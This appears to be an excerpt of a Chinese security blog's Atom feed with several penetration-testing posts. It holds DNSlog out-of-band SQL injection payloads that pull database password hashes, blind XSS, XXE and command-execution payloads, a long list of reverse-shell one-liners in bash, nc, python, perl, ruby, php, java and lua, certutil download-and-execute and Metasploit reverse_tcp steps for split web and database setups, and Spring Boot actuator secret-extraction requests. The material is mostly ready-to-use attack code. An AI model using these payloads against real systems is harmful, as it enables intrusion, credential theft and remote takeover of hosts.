+<pre><code>SELECT * FROM users WHERE id='1' and if((select load_file(concat('\\\\',(select database()),'.xxxxx.ceye.io\\abc'))),1,0)
+</code></pre>
+<p>查看<code>dnslog</code>日志，发现<code>security</code>数据库被查询出来：</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/10/28/xuVHor2RN5QM1Gf.png" alt="1298490-20171216204221827-1146117172.png" loading="lazy"></figure>
+<h5 id="sql-server-payload">SQL SERVER Payload</h5>
+<pre><code>DECLARE @host varchar(1024);
+SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') +'.ip.port.b182oj.ceye.io';
+EXEC('master..xp_dirtree&quot;\\'+@host+'\foobar$&quot;');
+</code></pre>
+<h5 id="oracle-payload">Oracle Payload</h5>
+<pre><code>SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
+SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
+SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
+</code></pre>
+<h5 id="postgresql-payload">PostgreSQL Payload</h5>
+<pre><code>DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;
+BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres');
+exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
+EXECUTE exec_cmd;
+END;
+$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT temp_function();
+</code></pre>
+<h5 id="0x04-xss无回显">0x04 XSS（无回显）</h5>
+<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<p><code>payload:&gt;&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code>让<code>src</code>请求我们的<code>dnslog</code>平台.<br>
+<img src="https://i.loli.net/2020/10/28/edhTXABE9HjyODq.png" alt="1298490-20171216205320671-1626266465.png" loading="lazy"></p>
+<h5 id="0x05-ssrf无回显">0x05 SSRF(无回显)</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;
+%remote;]&gt;
+&lt;/root&gt;
+</code></pre>
+<h5 id="0x06-命令执行无回显">0x06 命令执行（无回显）</h5>
+<p>当 <code>ping</code> 一个域名时会对其进行一个递归 <code>DNS</code> 查询的过程，这个时候就能在后端获取到 <code>DNS</code> 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p>
+<pre><code>linux
+
+curl http://haha.xxx.ceye.io/`whoami`
+ping `whoami`.xxxx.ceye.io
+</code></pre>
+<pre><code>Windows
+
+ping %USERNAME%.xxx.ceye.io
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/10/28/Zd7VsPzkWTiKISq.png" alt="1298490-20171216210336530-50112226.png" loading="lazy"></figure>
+<pre><code>cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot; del temp*
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/10/28/mX6vhrkKpVzbHtB.png" alt="1298490-20190523171204826-109608704.png" loading="lazy"></figure>
+<p>其他的在这个平台上有一些payload，参考这个链接：http://ceye.io/payloads</p>
+<p>参考链接：</p>
+<p>http://foreversong.cn/archives/861</p>
+<p>https://bbs.ichunqiu.com/thread-22002-1-1.html</p>
+<p>http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[反弹shell姿势]]></title>
+        <id>https://piaogexu.github.io/post/fan-dan-shell-zi-shi/</id>
+        <link href="https://piaogexu.github.io/post/fan-dan-shell-zi-shi/">
+        </link>
+        <updated>2020-11-28T07:20:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="反弹shell的n种姿势">反弹shell的N种姿势</h3>
+<h4 id="0x00-前言">0x00 前言</h4>
+<p>在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。</p>
+<h4 id="0x01-bash反弹">0x01 Bash反弹</h4>
+<h5 id="11-方法一">1.1 方法一</h5>
+<p>攻击者主机上执行监听：</p>
+<pre><code>nc -lvvp port
+</code></pre>
+<p>目标主机上执行：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1
+
+#bash -i   打开一个交互的bash
+#&gt;&amp;   将标准错误输出重定向到标准输出
+#/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口
+#0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互
+</code></pre>
+<p><strong><em>注</em>：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</strong></p>
+<p>linux shell下常用的文件描述符是：</p>
+<p>1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</p>
+<p>2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</p>
+<p>3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
+<p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
+<h5 id="12-方法二">1.2 方法二</h5>
+<pre><code>exec 0&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+/bin/bash  -i &gt; /dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1
+</code></pre>
+<h5 id="13-方法三">1.3 方法三</h5>
+<pre><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+</code></pre>
+<h4 id="0x02-telnet反弹">0x02 telnet反弹</h4>
+<h5 id="21-方法一">2.1 方法一</h5>
+<p>攻击者主机上打开两个终端分别执行监听：</p>
+<pre><code>nc -lvvp 4444
+
+nc -lvvp 5555
+</code></pre>
+<p>目标主机中执行：</p>
+<pre><code>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
+</code></pre>
+<p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p>
+<p>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p>
+<h5 id="22-方法二">2.2 方法二</h5>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p
+</code></pre>
+<h5 id="0x03-ncnetcat反弹">0x03 nc（netcat）反弹</h5>
+<p>攻击者主机上执行监听命令：</p>
+<pre><code>nc -lvvp port
+</code></pre>
+<p>目标主机上执行：</p>
+<pre><code>nc -e /bin/bash x.x.x.x port
+</code></pre>
+<p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p>
+<pre><code>rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f
+</code></pre>
+<p><strong>注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信</strong></p>
+<pre><code>nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。
+
+nc -c /bin/sh x.x.x.x 4444
+
+/bin/sh | nc x.x.x.x 4444
+</code></pre>
+<h4 id="0x04-常见脚本反弹">0x04 常见脚本反弹</h4>
+<h5 id="41-python">4.1 python</h5>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+<h5 id="42-perl">4.2 perl</h5>
+<p><strong>4.2.1 方法一</strong></p>
+<pre><code>perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<p><strong>4.2.2 方法二</strong></p>
+<pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<h5 id="43-ruby">4.3 Ruby</h5>
+<p><strong>4.3.1 方法一</strong></p>
+<pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+<p><strong>4.3.2 方法二</strong></p>
+<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+</code></pre>
+<h4 id="44-php">4.4 PHP</h4>
+<pre><code>php -r '$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<h4 id="45-java">4.5 java</h4>
+<pre><code>public class Revs {
+/**
+* @param args
+* @throws Exception 
+*/
+public static void main(String[] args) throws Exception {
+    // TODO Auto-generated method stub
+    Runtime r = Runtime.getRuntime();
+    String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+    Process p = r.exec(cmd);
+    p.waitFor();
+}
+}
+</code></pre>
+<h4 id="46-lua">4.6 Lua</h4>
+<pre><code>lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+<p><strong>注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</strong></p>
+<pre><code>nc -lvvp 5555
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[站库分离渗透思路]]></title>
+        <id>https://piaogexu.github.io/post/zhan-ku-fen-chi-shen-tou-si-lu/</id>
+        <link href="https://piaogexu.github.io/post/zhan-ku-fen-chi-shen-tou-si-lu/">
+        </link>
+        <updated>2020-11-28T07:20:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="站库分离渗透思路">站库分离渗透思路</h3>
+<h4 id="何为站库分离">何为站库分离</h4>
+<p>站库分离其实就是管理员将网站程序和数据库分别放在了不同的内网服务器上，这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。</p>
+<p>这种情况大多出现在内网环境，不过也有少部分管理员会使用公网数据库，如：自建公网数据库、Amazon/阿里/腾讯/华为RDS云数据库等，并设置允许连接该数据库的白名单IP地址。</p>
+<h4 id="站库分离渗透入口">站库分离渗透入口</h4>
+<ul>
+<li>(1) Web入口渗透</li>
+</ul>
+<p>通过网站的各种漏洞来<code>Getshell</code>，如：文件上传、文件包含、命令执行、代码执行、<code>SQL</code>注入写入一句话（<code>Into outfile</code>、日志备份）等，在获得<code>Webshell</code>权限或者有诸如文件读取等漏洞时，我们可以读数据库配置文件、对数据库内容分析、查找数据库备份，进而对内网数据库服务器进行渗透。</p>
+<ul>
+<li>(2) Data入口渗透</li>
+</ul>
+<p>从数据库入口渗透同样是为了获取更大的权限，或者扩展我们的渗透成果。比如从这台数据库服务器中可以得到网站和数据库的一些用户、密码等信息，在后续的内网渗透中可以很有效的帮助我们。</p>
+<p>通过外网暴露的数据库弱口令、反编译或嗅探<code>C/S</code>客户端以及<code>Web</code>网站<code>SQL</code>注入漏洞等，在获得数据库账户密码或者利用<code>sqlmap</code>进入到<code>os-shell</code>、<code>sql-shell</code>，这时我们不能写入<code>Webshel</code>，因为这台数据库服务器中没有<code>Web</code>环境，但可以通过以下方式来做信息搜集和获取权限，先拿到这台数据库服务器权限，然后再尝试对<code>Web</code>服务器和内网其他主机进行渗透。</p>
+<h4 id="站库分离判断方法">站库分离判断方法</h4>
+<ul>
+<li>(1) 网络连接状态</li>
+</ul>
+<p>通过<code>Netstat</code>命令查看<code>MSSQL</code>数据库<code>1433</code>端口的网络连接状态，可以看到与当前<code>MSSQL</code>数据库服务器<code>192.168.32.8</code>建立连接的只有<code>192.168.32.3</code>，由此可以判断这台主机为<code>Web</code>服务器。</p>
+<pre><code>netstat -ano | findstr &quot;1433&quot;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/11/03/Ndh9Jo2stKz7yFv.png" alt="1604367094_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(2) 数据库配置文件</li>
+</ul>
+<p>通过网站程序数据库配置文件来判断是否站库分离，如果数据库<code>IP</code>地址是<code>localhost</code>、<code>127.0.0.1</code>或当前主机内网IP则说明为同服务器，反之则可能为站库分离，自建公网数据库和<code>RDS</code>云数据库除外。</p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/11/03/XKlp9FSCMIxNEbi.png" alt="1604367207_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(3) MySQL内置函数和库</li>
+</ul>
+<p>通过<code>MySQL</code>的<code>@@hostname</code>内置函数可以查看服务端主机名称，<code>information_schema</code>内置库的<code>PROCESSLIST</code>可以定位到当前已连接数据库的用户名、主机和端口号等信息，<code>Windows</code>连接格式：<code>主机名:Port</code>，Linux连接格式：<code>IP:Port</code>，本地连接格式：<code>localhost:Port</code>。</p>
+<pre><code>select @@hostname;                                 //服务端主机名称
+select * from information_schema.PROCESSLIST;      //客户端主机名称和端口
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/11/03/wDkq92PniNJBTLM.png" alt="1604367343_1_.jpg" loading="lazy"></figure>
+<p>也可以通过<code>load_file()</code>这个内置函数读取一些敏感文件，如：<code>hosts</code>文件中解析的一些内网业务的IP地址和域名，<code>IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere</code>的相关配置文件以及网卡信息等。</p>
+<pre><code>
+select load_file('C:/Windows/System32/drivers/etc/hosts');
+/etc/hosts
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/udev/rules.d/70-persistent-net.rules          //获取网卡名称
+/etc/network/interfaces                            //DHCP或静态IP
+/var/lib/dhclient/dhclient--网卡.lease             //DHCP
+/etc/sysconfig/network-scripts/ifcfg-网卡          //静态IP
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/system32/inetsrv/MetaBase.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/phpStudy/Apache/conf/httpd.conf
+C:/phpStudy/Apache/conf/vhosts.conf
+C:/phpStudy/PHPTutorial/Apache/conf/httpd.conf
+C:/phpStudy/PHPTutorial/Apache/conf/vhosts.conf
+C:/phpStudy/PHPTutorial/nginx/conf/nginx.conf
+C:/phpStudy/PHPTutorial/nginx/conf/vhosts.conf
+[...SNIP...]
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/11/03/zfTjQFw2ZtaqIUX.png" alt="1604368325_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(4) MSSQL内置函数和表</li>
+</ul>
+<p>通过<code>MSSQL</code>的<code>host_name()</code>、<code>@@servername</code>和<code>serverproperty</code>几个内置函数来判断是否站库分离，如果客户端与服务端返回的主机名不一样则说明为站库分离，返回的主机名一样则说明可能为同服务器。</p>
+<pre><code>select host_name();                       //客户端主机名称
+select @@servername;                      //服务端主机名称
+select serverproperty('MachineName');     //服务端主机名称
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/11/03/1lJt8YbSBzLIkwU.png" alt="1604368395_1_.jpg" loading="lazy"></figure>
+<p>也可以通过<code>MSSQL</code>的<code>sysprocesses</code>系统表来判断是否站库分离，它的功能类似于<code>MySQL</code>中的<code>PROCESSLIST</code>，可以定位到当前已连接到<code>sqlinject</code>数据库的用户名和主机名等信息。</p>
+<p>有时会有内网多台<code>Web</code>服务器同时连接一台数据库服务器中的不同数据库，这时我们就可以利用这种方式来查看连接到某数据库的用户名和主机名等信息，然后使用<code>Ping</code>主机名得到这台<code>Web</code>服务器的内网<code>IP</code>地址。</p>
+<pre><code>select name from master.sys.sysdatabases;
+select * from master.sys.sysprocesses where dbid= db_id('sqlinject');
+exec master..xp_cmdshell 'cmd /c ping WIN-111111111';
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/11/03/oJMq5jT8bFXLx9D.png" alt="1604368481_1_.jpg" loading="lazy"></figure>
+<p>还可以直接通过以下<code>MSSQL</code>注入语句来判断是否站库分离，<code>news</code>必须为数据库中存在的表名，当然用其他存在的表名也是可以的，如果注入页面返回不正常则说明为站库分离，反之则为同服务器。</p>
+<pre><code>and exists(select * from news where 1=(SELECT (case when host_name()=@@servername then 1 else 0 end)))
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2020/11/03/pGIN2dE4uzlRTvK.png" alt="1604368547_1_.jpg" loading="lazy"></figure>
+<h4 id="站库分离利用思路">站库分离利用思路</h4>
+<ul>
+<li>(1) 下载远程文件</li>
+</ul>
+<p>目标主机允许通外网时我们可以利用<code>Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell</code>等方式来下载远程文件到可读写目录中，然后再去执行一下即可。</p>
+<pre><code>certutil -urlcache -split -f http://155.**.***.229:8888/msf.exe C:\ProgramData\msf.exe
+C:\ProgramData\msf.exe
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2020/11/03/ZUM247sArKN5pYI.png" alt="EVSZ__43_6XG5RQ__`X_E_X.png" loading="lazy"></figure>
+<ul>
+<li>(2) 执行远程Payload</li>
+</ul>
+<p>目标主机允许通外网时我们可以直接利用<code>Metasploit</code>下的<code>exploit/multi/script/web_delivery和exploit/windows/misc/hta_server</code>两个模块来执行远程<code>Payload</code>获取会话，比第一种方法更简单快捷。</p>
+<pre><code>set target 1
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 155.**.***.229
+set lport 443
+exploit
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2020/11/03/hIN2RkgrmitWlP3.png" alt="1604368737_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(3) 模拟令牌权限提升<br>
+曾经在几个这样的“<code>MSSQL</code>站库分离”实战环境中直接通过<code>Incognito</code>扩展中的模拟令牌功能获取到数据库服务器的<code>Admin/SYSTEM</code>令牌。</li>
+</ul>
+<p>在本地“站库分离”靶场环境中测试发现，只要有主机在使用<code>Windows</code>身份验证连接到这台数据库服务器的<code>MSSQL</code>时就会保留当前登录用户的令牌，而大多数人又都是以默认<code>Administrator</code>管理员来安装的<code>MSSQL</code>，所以能够直接获取到<code>Administrator</code>令牌。</p>
+<p>支持Windows身份验证的数据库连接工具有：<code>sqlcmd</code>、<code>SSMS</code>和<code>Navicat Premium</code>等。</p>
+<pre><code>C:\Program Files\Microsoft SQL Server\100\Tools\Binn\sqlcmd.exe -S &quot;192.168.1.109&quot; -E
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2020/11/03/hIN2RkgrmitWlP3.png" alt="1604368737_1_.jpg" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[资料Spring_Boot相关]]></title>
+        <id>https://piaogexu.github.io/post/zi-liao-spring_boot-xiang-guan/</id>
+        <link href="https://piaogexu.github.io/post/zi-liao-spring_boot-xiang-guan/">
+        </link>
+        <updated>2020-11-28T07:20:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="spring_boot">Spring_Boot</h3>
+<pre><code>转载：https://my.oschina.net/u/4615518/blog/4505210
+
+作者github地址：https://github.com/LandGrey/SpringBootVulExploit
+</code></pre>
+<h4 id="0x01路由知识">0x01：路由知识</h4>
+<ul>
+<li>
+<p><code>Spring Boot 1.x</code> 版本默认内置路由的根路径以<code>/</code>开始，<code>2.x</code>则统一以<code>/actuator</code>开始</p>
+</li>
+<li>
+<p>有些程序员会自定义<code>/manage</code>、<code>/management</code>或<strong>项目相关名称</strong>为根路径</p>
+</li>
+<li>
+<p>默认内置路由名字，如<code>/env</code>有时候也会被程序员修改，如修改成<code>/appenv</code></p>
+</li>
+</ul>
+<h4 id="0x02版本知识">0x02：版本知识</h4>
+<p><code>Spring Cloud</code>是基于<code>Spring Boot</code> 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
+<h5 id="常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</h5>
+<table>
+<thead>
+<tr>
+<th>依赖项</th>
+<th>版本列表及依赖组件版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>spring-boot-starter-parent</td>
+<td>spring-boot-starter-parent</td>
+</tr>
+<tr>
+<td>spring-boot-dependencies</td>
+<td>spring-boot-dependencies</td>
+</tr>
+<tr>
+<td>spring-cloud-dependencies</td>
+<td>spring-cloud-dependencies</td>
+</tr>
+</tbody>
+</table>
+<h5 id="spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</h5>
+<table>
+<thead>
+<tr>
+<th>Spring Cloud</th>
+<th>Spring Boot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Angel</td>
+<td>兼容 Spring Boot 1.2.x</td>
+</tr>
+<tr>
+<td>Brixton</td>
+<td>兼容 Spring Boot 1.3.x、1.4.x</td>
+</tr>
+<tr>
+<td>Camden</td>
+<td>兼容 Spring Boot 1.4.x、1.5.x</td>
+</tr>
+<tr>
+<td>Dalston</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Edgware</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Finchley</td>
+<td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
+</tr>
+<tr>
+<td>Greenwich</td>
+<td>兼容 Spring Boot 2.1.x</td>
+</tr>
+<tr>
+<td>Hoxton</td>
+<td>兼容 Spring Boot 2.2.x</td>
+</tr>
+</tbody>
+</table>
+<h5 id="spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</h5>
+<table>
+<thead>
+<tr>
+<th>版本号后缀</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BUILD-SNAPSHOT</td>
+<td>快照版，代码不是固定，处于变化之中</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>里程碑版</td>
+</tr>
+<tr>
+<td>RCX</td>
+<td>候选发布版</td>
+</tr>
+<tr>
+<td>RELEASE</td>
+<td>正式发布版</td>
+</tr>
+<tr>
+<td>SRX</td>
+<td>(修复错误和 bug 并再次发布的)正式发布版</td>
+</tr>
+</tbody>
+</table>
+<h3 id="一信息泄露">一：信息泄露</h3>
+<h4 id="0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</h4>
+<p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
+<p>直接访问以下几个路由，验证漏洞是否存在：</p>
+<pre><code>/api-docs
+/v2/api-docs
+/swagger-ui.html
+</code></pre>
+<p>一些可能会遇到的接口路由变形：</p>
+<pre><code>/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+</code></pre>
+<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
+<pre><code>/mappings
+/actuator/mappings
+/metrics
+/actuator/metrics
+/beans
+/actuator/beans
+/configprops
+/actuator/configprops
+</code></pre>
+<p><strong>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞；</strong></p>
+<p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p>
+<h4 id="0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</h4>
+<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+<p>参考 <code>production-ready-endpoints</code> 和 <code>spring-boot.txt</code>，可能因为配置不当而暴露的默认内置路由可能会有：</p>
+<pre><code>/actuator
+/auditevents
+/autoconfig
+/beans
+/caches
+/conditions
+/configprops
+/docs
+/dump
+/env
+/flyway
+/health
+/heapdump
+/httptrace
+/info
+/intergrationgraph
+/jolokia
+/logfile
+/loggers
+/liquibase
+/metrics
+/mappings
+/prometheus
+/refresh
+/scheduledtasks
+/sessions
+/shutdown
+/trace
+/threaddump
+/actuator/auditevents
+/actuator/beans
+/actuator/health
+/actuator/conditions
+/actuator/configprops
+/actuator/env
+/actuator/info
+/actuator/loggers
+/actuator/heapdump
+/actuator/threaddump
+/actuator/metrics
+/actuator/scheduledtasks
+/actuator/httptrace
+/actuator/mappings
+/actuator/jolokia
+/actuator/hystrix.stream
+</code></pre>
+<p>其中对寻找漏洞比较重要接口的有：</p>
+<pre><code>/env、/actuator/env
+</code></pre>
+<p><code>GET</code> 请求 <code>/env</code> 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 <code>password</code> 写成<code>psasword</code>、<code>pwd</code>) 时，会泄露密码明文；</p>
+<p>同时有一定概率可以通过 <code>POST</code> 请求 <code>/env</code> 接口设置一些属性，触发相关 <code>RCE</code> 漏洞。</p>
+<pre><code>/jolokia
+</code></pre>
+<p>通过<code>/jolokia/list</code>接口寻找可以利用的<code>MBean</code>，触发相关<code>RCE</code>漏洞。</p>
+<pre><code>/trace
+</code></pre>
+<p>一些 <code>http</code> 请求包访问跟踪信息，有可能发现有效的 <code>cookie</code> 信息。</p>
+<h4 id="0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</h4>
+<p>访问<code>/env</code>接口时，<code>spring actuator</code>会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果。</p>
+<h5 id="利用条件">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在<code>/jolokia</code>或<code>/actuator/jolokia</code>接口。</p>
+</li>
+<li>
+<p>目标使用了<code>jolokia-core</code>依赖（版本要求暂未知）。</p>
+</li>
+</ul>
+<h5 id="利用方法">利用方法：</h5>
+<h6 id="步骤一找到想要获取的属性名">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二jolokia-调用相关-mbean-获取明文">步骤二：jolokia 调用相关 Mbean 获取明文</h6>
+<p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 <code>response</code> 数据包中的 <code>value</code> 键中。</p>
+<ul>
+<li>调用 <code>org.springframework.boot Mbean</code>（可能更通用）</li>
+</ul>
+<p><strong>实际上是调用 <code>org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar</code> 类实例的 <code>getProperty</code> 方法</strong></p>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<p>spring 2.x</p>
